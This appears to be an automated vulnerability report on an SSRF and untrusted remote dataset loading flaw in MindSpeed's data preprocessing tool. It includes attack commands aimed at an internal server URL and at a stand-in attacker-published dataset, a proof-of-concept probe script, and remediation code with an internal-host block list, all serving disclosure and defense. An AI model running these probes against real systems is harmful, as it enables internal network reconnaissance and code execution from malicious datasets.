# Vulnerability Detail Report: SSRF and Untrusted Remote Dataset Loading

## Vulnerability Metadata

| Field | Value |
|-------|-------|
| **Vulnerability ID** | VULN-CROSS-TOOLS-DATA-LOAD-001 |
| **Type** | Server-Side Request Forgery (SSRF) / Untrusted Data Loading (CWE-918) |
| **Severity** | High |
| **Confidence** | 85% |
| **CWE** | CWE-918: Server-Side Request Forgery (SSRF) |
| **Affected Files** | `tools/preprocess_data.py`, `tools/data_handler.py` |
| **Affected Function** | `build_dataset()` @ tools/data_handler.py:505-554 |
| **Entry Point** | `main()` @ tools/preprocess_data.py:172-188 |
| **Trust Level** | untrusted_local (CLI) → remote_server |

## Executive Summary

The data preprocessing CLI tool (`preprocess_data.py`) accepts user-controlled `--input` argument that flows across files to `data_handler.py`'s `build_dataset()` function, which directly passes this value to HuggingFace's `load_dataset()` for remote dataset fetching. When the input path does not exist locally (line 516: `os.path.exists(args.input)` returns False), the code assumes it's a HuggingFace dataset name and fetches data from remote servers without any validation, enabling SSRF attacks and potential remote code execution via malicious datasets from HuggingFace Hub.

## Vulnerable Code Analysis

### Entry Point: tools/preprocess_data.py (Lines 87-88, 172-179)

```python
# Argument definition - accepts ANY string as input
group.add_argument('--input', type=str,
                   help='Path to input JSON or path or a huggingface dataset name')

# Main function - passes user input directly to build_dataset
def main():
    args = get_args()  # Parses command line, including --input
    # ...
    logger.info("building dataset: %s", args.input)
    raw_data = build_dataset(args)  # Cross-file data flow: args.input → build_dataset
```

### Sink Point: tools/data_handler.py (Lines 505-554)

```python
def build_dataset(args):
    """loading dataset by huggingface"""
    # ... (lines 507-513 handle --hf-datasets-params, covered by VULN-tools-load_dataset-001)
    
    cache_dir = DEFAULT_CACHE_DIR
    split_flag = "train"
    
    # VULNERABLE: Trust decision based solely on local file existence
    load_from_local = os.path.exists(args.input)  # Line 516
    
    if load_from_local:
        # ... local file handling (covered by VULN-tools-load_dataset-003)
    else:
        # SSRF VULNERABILITY: Remote dataset loading without validation
        logger.info("loading data from remote huggingface")
        raw_datasets = load_dataset(
            args.input,          # USER-CONTROLLED: Any string can be passed
            split=split_flag,
            num_proc=None if args.streaming else args.workers,
            cache_dir=cache_dir,
            streaming=args.streaming
        )  # Lines 547-553
    return raw_datasets
```

### Trust Boundary Violation

```
┌────────────────────────────────────────────────────────────────────────────────┐
│ TRUST BOUNDARY: CLI (Local, Untrusted) → Remote Server (External, Untrusted)   │
└────────────────────────────────────────────────────────────────────────────────┘

[Local User Context]                [Remote Server Context]
      │                                      │
      │ args.input                           │
      │ (untrusted string)                   │
      ├──────────────────────────────────────┤
      │                                      │
      │  os.path.exists() == False           │
      │                                      │
      │         ┌────────────────────────────┼──→ HuggingFace Hub
      │         │                            │
      │         │  load_dataset(args.input)  │
      │         │                            │
      │         └────────────────────────────┼──→ Arbitrary Remote URL
      │                                      │
      │                                      │
```

## Data Flow Analysis

### Complete Cross-File Data Flow Path

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ FILE: tools/preprocess_data.py                                              │
│                                                                             │
│ argv (command line arguments)                                               │
│     │                                                                       │
│     ▼                                                                       │
│ argparse.parse_args() [Line 157]                                            │
│     │                                                                       │
│     ▼                                                                       │
│ args.input (user-controlled string)                                         │
│     │                                                                       │
│     ▼                                                                       │
│ main() → build_dataset(args) [Line 179]                                     │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     │ Cross-file boundary
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ FILE: tools/data_handler.py                                                 │
│                                                                             │
│ build_dataset(args) [Line 505]                                              │
│     │                                                                       │
│     ▼                                                                       │
│ load_from_local = os.path.exists(args.input) [Line 516]                     │
│     │                                                                       │
│     │ if False (file doesn't exist locally)                                │
│     ▼                                                                       │
│ load_dataset(args.input) [Line 547-553]                                     │
│     │                                                                       │
│     ▼                                                                       │
│ ┌───────────────────────────────────────────────────────────────────────┐   │
│ │ REMOTE DATA FETCH:                                                     │   │
│ │ - HuggingFace Hub dataset                                              │   │
│ │ - Arbitrary dataset from remote URL                                    │   │
│ │ - Potentially malicious dataset with embedded code                     │   │
│ └───────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Call Graph Evidence

From `scan-results/.context/call_graph.json`:
```json
{
  "source": "argv@tools/preprocess_data.py",
  "path": ["main@tools/preprocess_data.py", "build_dataset@tools/data_handler.py"],
  "sink": "load_dataset@tools/data_handler.py",
  "sink_type": "file_load",
  "description": "命令行参数到数据集加载"
}
```

## Attack Scenarios

### Scenario 1: SSRF via HuggingFace Dataset Name

**Attack Vector**: Abuse the HuggingFace datasets library's URL handling capabilities.

```bash
# Step 1: Craft input that triggers remote loading
python tools/preprocess_data.py \
    --input "http://internal-server:8080/sensitive-data" \
    --tokenizer-type GPT2BPETokenizer \
    --output-prefix ./output
```

**Attack Outcome**: 
- The tool attempts to fetch data from the specified URL
- If `http://internal-server` is an internal resource not accessible externally, this constitutes SSRF
- Attacker can probe internal network topology

### Scenario 2: Remote Code Execution via Malicious HuggingFace Dataset

**Attack Vector**: Create a malicious dataset on HuggingFace Hub that contains executable code.

```bash
# Step 1: Attacker publishes malicious dataset to HuggingFace Hub
# Dataset name: "attacker/malicious-dataset"
# Dataset contains a loading script with embedded malware

# Step 2: Victim runs preprocessing tool with the malicious dataset
python tools/preprocess_data.py \
    --input "attacker/malicious-dataset" \
    --tokenizer-type GPT2BPETokenizer \
    --output-prefix ./output

# Step 3: HuggingFace datasets library:
# - Downloads the dataset loading script
# - Executes the script (unless trust_remote_code is explicitly False)
# - Malicious code runs with victim's privileges
```

**Note**: Modern versions of `datasets` library require `trust_remote_code=True` for execution, but:
1. The code does NOT set `trust_remote_code=False` explicitly
2. The default behavior may vary by version
3. User may be tricked into adding this parameter via `--hf-datasets-params` (covered by VULN-tools-load_dataset-001)

### Scenario 3: Data Poisoning Attack

**Attack Vector**: Poison a popular dataset on HuggingFace Hub (or create a convincing fake).

```bash
# Step 1: Attacker modifies or creates a dataset with poisoned data
# - Inject malicious prompts into training data
# - Include backdoor triggers in text samples
# - Add samples that exploit tokenizer vulnerabilities

# Step 2: Victim unknowingly processes poisoned data
python tools/preprocess_data.py \
    --input "popular/legitimate-looking-dataset" \
    --tokenizer-type PretrainedFromHF \
    --tokenizer-name-or-path gpt2 \
    --output-prefix ./training_data

# Step 3: Poisoned data enters training pipeline
# - Training model learns malicious patterns
# - Model exhibits attacker-controlled behavior
```

## PoC Construction思路

### Proof of Concept 1: SSRF Detection

```python
# test_ssrf_detection.py
import subprocess
import time

# Start a simple internal server for testing
internal_server = subprocess.Popen(['python', '-m', 'http.server', '8888'], 
                                   cwd='/tmp', stdout=subprocess.PIPE)

# Create a marker file
open('/tmp/marker.txt', 'w').write('INTERNAL_RESOURCE')

# Run the vulnerable tool targeting internal server
result = subprocess.run([
    'python', 'tools/preprocess_data.py',
    '--input', 'http://localhost:8888/marker.txt',
    '--tokenizer-type', 'GPT2BPETokenizer',
    '--output-prefix', '/tmp/test_output'
], capture_output=True, text=True)

# Check if the tool attempted to access internal resource
if 'localhost:8888' in result.stderr or result.returncode != 0:
    print("SSRF vulnerability confirmed - tool attempted remote fetch")

internal_server.terminate()
```

### Proof of Concept 2: Malicious Dataset Detection

```bash
# Use a known HuggingFace dataset to verify remote loading behavior
python tools/preprocess_data.py \
    --input "imdb" \  # Known HuggingFace dataset
    --tokenizer-type GPT2BPETokenizer \
    --output-prefix ./test_output \
    --seq-length 128

# Check logs: "loading data from remote huggingface" confirms SSRF path triggered
# Check cache directory for evidence of remote fetch
ls ~/tmp/datasets/imdb*
```

## Security Impact Assessment

### Impact Categories

| Category | Severity | Description |
|----------|----------|-------------|
| **Confidentiality** | HIGH | Internal network resources may be probed via SSRF |
| **Integrity** | HIGH | Malicious datasets can poison training data |
| **Availability** | MEDIUM | Network requests to unavailable resources cause hangs |
| **Remote Code Execution** | HIGH | If dataset contains executable code (combined with VULN-tools-load_dataset-001) |

### Attack Requirements

| Requirement | Level | Notes |
|-------------|-------|-------|
| Privileges Required | Low | User-level CLI access |
| User Interaction | Required | Victim must run the preprocessing tool |
| Attack Complexity | Low | Simple command line manipulation |
| Scope | Changed | Can affect internal network, training pipeline |

## Missing Mitigations Analysis

### Current State: NO Security Controls

| Mitigation | Status | Location Expected | Actual State |
|------------|--------|-------------------|--------------|
| Input validation | MISSING | build_dataset() | ❌ None |
| URL/domain whitelist | MISSING | build_dataset() | ❌ None |
| trust_remote_code=False | MISSING | load_dataset() call | ❌ Not set |
| Network access control | MISSING | build_dataset() | ❌ None |
| Security warning | MISSING | build_dataset() | ❌ None |
| Dataset verification | MISSING | build_dataset() | ❌ None |

### Contrast with Other Project Security Measures

The project demonstrates awareness of `trust_remote_code` risks elsewhere:

```python
# mindspeed/tokenizer/tokenizer.py (Line 75)
hf_tokenizer_kwargs["trust_remote_code"] = False  # SECURE

# mindspeed/tokenizer/build_tokenizer/adaptor.py (Line 58)
hf_tokenizer_kwargs["trust_remote_code"] = False  # SECURE

# tools/data_handler.py (Lines 547-553)
load_dataset(args.input, ...)  # VULNERABLE: No trust_remote_code control!
```

## Related Vulnerabilities

This vulnerability is related to but distinct from:

| Vulnerability ID | Focus | Relation |
|------------------|-------|----------|
| VULN-tools-load_dataset-001 | Parameter injection via `--hf-datasets-params` | Same sink, different source |
| VULN-tools-load_dataset-003 | Local Python script execution | Same file, different code path |

**Key Difference**: This vulnerability specifically covers the SSRF path when `--input` is NOT a local file, which triggers remote dataset fetching.

## Recommended Remediation

### Priority 1: Add trust_remote_code Protection

```python
# tools/data_handler.py - build_dataset() modification
def build_dataset(args):
    """loading dataset by huggingface"""
    # ... existing code ...
    
    if not load_from_local:
        logger.info("loading data from remote huggingface")
        
        # SECURITY: Explicitly disable remote code execution
        raw_datasets = load_dataset(
            args.input,
            split=split_flag,
            num_proc=None if args.streaming else args.workers,
            cache_dir=cache_dir,
            streaming=args.streaming,
            trust_remote_code=False  # CRITICAL: Prevent code execution from remote datasets
        )
    return raw_datasets
```

### Priority 2: Add Input Validation and Whitelist

```python
# tools/data_handler.py
import re

ALLOWED_HF_DATASET_PATTERN = re.compile(r'^[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+$')
ALLOWED_HF_ORGS = ['openai', 'google', 'facebook', 'microsoft', 'allenai', 'huggingface']

def _validate_remote_dataset_name(dataset_name):
    """Validate that dataset name is from a trusted source."""
    if not ALLOWED_HF_DATASET_PATTERN.match(dataset_name):
        raise ValueError(f"Invalid dataset name format: {dataset_name}")
    
    org = dataset_name.split('/')[0]
    if org not in ALLOWED_HF_ORGS:
        logger.warning(f"Loading dataset from non-whitelisted organization: {org}")
        # Optionally require explicit user confirmation
    
    return True

def build_dataset(args):
    # ...
    if not load_from_local:
        # SECURITY: Validate remote dataset name before loading
        _validate_remote_dataset_name(args.input)
        raw_datasets = load_dataset(
            args.input,
            split=split_flag,
            trust_remote_code=False,
            # ... other params
        )
```

### Priority 3: Add SSRF Protection for URL Inputs

```python
# tools/data_handler.py
import urllib.parse

BLOCKED_URL_SCHEMES = ['file', 'ftp', 'gopher', 'ldap']
BLOCKED_URL_PATTERNS = ['localhost', '127.', '10.', '192.168.', '172.', '.internal', '.local']

def _validate_url_safety(url_or_dataset):
    """Prevent SSRF attacks on URL inputs."""
    parsed = urllib.parse.urlparse(url_or_dataset)
    
    # Block dangerous schemes
    if parsed.scheme in BLOCKED_URL_SCHEMES:
        raise ValueError(f"Blocked URL scheme: {parsed.scheme}")
    
    # Block internal/private IP patterns
    for pattern in BLOCKED_URL_PATTERNS:
        if pattern in parsed.netloc:
            raise ValueError(f"Blocked internal URL: {parsed.netloc}")
    
    return True
```

### Priority 4: Add Security Documentation

Update `SECURITYNOTE.md`:

```markdown
### Remote Dataset Loading Security Warning

当 `--input` 参数指定一个非本地路径时，工具将从 HuggingFace Hub 或远程服务器加载数据集。
请确保：

1. 仅使用来自可信组织的数据集（如 openai, google, facebook, allenai）
2. 检查数据集的下载量和社区评分
3. 验证数据集的来源和作者信誉
4. 不要使用包含自定义加载脚本的数据集（除非已验证其安全性）

SSRF风险：工具可能尝试访问内部网络资源，请勿将内部URL作为输入。
```

## Verification Status

| Check | Status | Evidence |
|-------|--------|----------|
| Vulnerability confirmed | ✅ Yes | Code analysis shows no validation |
| Cross-file data flow verified | ✅ Yes | call_graph.json confirms flow |
| SSRF path identified | ✅ Yes | Line 545-553 triggers remote fetch |
| Mitigation absent | ✅ Yes | No trust_remote_code, no URL validation |
| Attack realistic | ✅ Yes | HuggingFace Hub is commonly used |

## Metadata

- **Analyzed by**: details-worker
- **Analysis Date**: 2026-04-20
- **Project**: MindSpeed
- **Repository**: /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed
- **Cross-file Analysis**: tools/preprocess_data.py → tools/data_handler.py
- **Trust Boundary**: Local CLI → Remote Server (HuggingFace Hub)

## References

- **CWE-918**: Server-Side Request Forgery (SSRF) - https://cwe.mitre.org/data/definitions/918.html
- **HuggingFace Datasets Security**: https://huggingface.co/docs/datasets/security
- **HuggingFace trust_remote_code**: https://huggingface.co/docs/datasets/main/en/package_reference/loading_methods#datasets.load_dataset.trust_remote_code
- **SSRF in ML Pipelines**: Similar vulnerabilities reported in ML tooling (torch.load, model loading)

---
